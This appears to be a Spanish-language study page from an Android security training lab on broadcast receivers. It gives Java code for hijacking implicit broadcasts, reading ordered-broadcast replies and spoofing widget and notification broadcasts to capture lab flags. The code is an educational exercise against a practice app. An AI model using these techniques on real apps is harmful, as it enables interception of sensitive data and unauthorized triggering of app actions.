---
title: Broadcast receivers
sidebar_position: 1
---

## ¿Qué es?
Las apps pueden enviar o recbir mensajes de Broadcast desde el sistema Android o desde otras apps. (Son muy similares al diseño publicar-suscribir). Esos se envian cuando ocurre un evento de interes, por ejemplo, que el sistema envie un mensaje de broadcast cuando esta cargando el dispositivo, o cuando se conectaron los audifonos. De igual forma una app puede enviar un mensaje de broadcast, por ejemplo, cuando se descargo un fichero nuevo.

Hay dos formas de utilizar broadcast receivers, uno es colocando la tag `<receiver>` directamente en el AndroidManifest.xml y la otra es dinamicamente, registrando una clase con registerReceiver() directo en el codigo Java.

## Enviar Broadcast

Cuando se quiere enviar un broadcast, es muy similar a enviar un intent, solo que se utiliza startBroadcast(). Algo relevante es que a partir de Android 8, se tiene que definir hacia que app va el broadcast(Explicit Intent), ya que de esa forma Android ahorra bateria, evitando que el broadcast le llegue potencialmente a cientos de apps

```java
                Intent intent = new Intent();
                intent.setAction("io.hextree.attacksurface.receivers.Flag16Receiver");
                intent.putExtra("flag","give-flag-16");
                intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag16Receiver");
                sendBroadcast(intent);
```

## System Broadcast

Estos broadcast son generados por el sistema, por ejemplo, cuando conectas unos audifonos, o cuando desconectas el celular de la carga, estos no pueden ser enviados por otra app, dara un error de seguridad, sin embargo, conviene analizar estos flujos para ver si estan bien implementados, o es posible enviar algun broadcast generico que triggeree el flujo.

## Broadcast Hijack

Cuando una aplicación envía un broadcast implícito, es posible interceptarlo y visualizar su información, sin embargo para esto se debe registrar dinámicamente (En el codigo de JAVA) que somos el recibidor, esto debido al manejo de batería a partir de Android 8.

```java
        TextView textohijacker = findViewById(R.id.textohijacker);
        
        BroadcastReceiver receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String flag2 = intent.getStringExtra("flag");
                textohijacker.setText(flag2);

                setResultCode(1);
            }
        };
        
        IntentFilter filter = new IntentFilter("io.hextree.broadcast.FREE_FLAG");
        registerReceiver(receiver,filter, Context.RECEIVER_EXPORTED);
```

## Broadcast Return con info sensible

Si una app recibe un broadcast al cual va a otorgar una respuesta, es posible leer esa respuesta. Primeramente enviamos el Broadcast y posteriormente leemos la respuesta al broadcast previamente enviado:

```java
                Intent intent = new Intent();
                intent.setAction("io.hextree.attacksurface.receivers.Flag17Receiver");
                intent.putExtra("flag","give-flag-17");
                intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver");
                
                sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context context, Intent intent2) {
                        int rc = getResultCode();
                        String rd = getResultData();
                        Bundle extras = getResultExtras(false);
                        String flag = extras.getString("flag");

                        TextView text = findViewById(R.id.textView213);
                        text.setText(flag);
                    }
                }, null, 0, null, null);
```

## Widgets

Los widgets se implementan mediante un extends AppWidgetProvider, los cuales a su vez provienen de un extends BroadcastReceiver, esto debido a que se requiere para actualizar los datos en segundo plano. De igual forma para manejar las interacciones cuando presionas un botón del widget (Se envia un broadcast con pendingintent). Estos de igual forma estan declarados en el AndroidManifest, y obvio no podemos impersonar Android perse, pero cuando se presionan los botones tambien se envian broadcast, y esos si los podemos impersonar:

```java
 <receiver android:name="io.hextree.attacksurface.receivers.Flag19Widget" android:exported="true">
            <intent-filter>
                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
            </intent-filter>
            <meta-data android:name="android.appwidget.provider" android:resource="@xml/flag_home_widget_info"/>
        </receiver>
```

De igual forma, si contiene un .contains en el java y no una comparacion directa, es posible impersonar el broadcast de widgets (APPWIDGET_UPDATE):

```java
                Intent intent = new Intent();
                intent.setAction("io.hextree.action.APPWIDGET_UPDATE");
                intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
                Bundle bundle = new Bundle();
                bundle.putInt("appWidgetMaxHeight", 1094795585);
                bundle.putInt("appWidgetMinHeight", 322376503);
                intent.putExtra("appWidgetOptions",bundle);
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag19Widget");
                sendBroadcast(intent);
```

## Notifications

Las notificaciones pueden tener botones, y esos botones funcionan utilizando un pendingIntent enviado mediante un broadcast, algo relevante es que si el Receiver se registra mediante registerReceiver(), este se vuelve un Broadcast implicito:

```java
                Intent intent = new Intent();
                intent.setAction("io.hextree.broadcast.GET_FLAG");
                intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
                intent.putExtra("give-flag",true);
                sendBroadcast(intent);
```
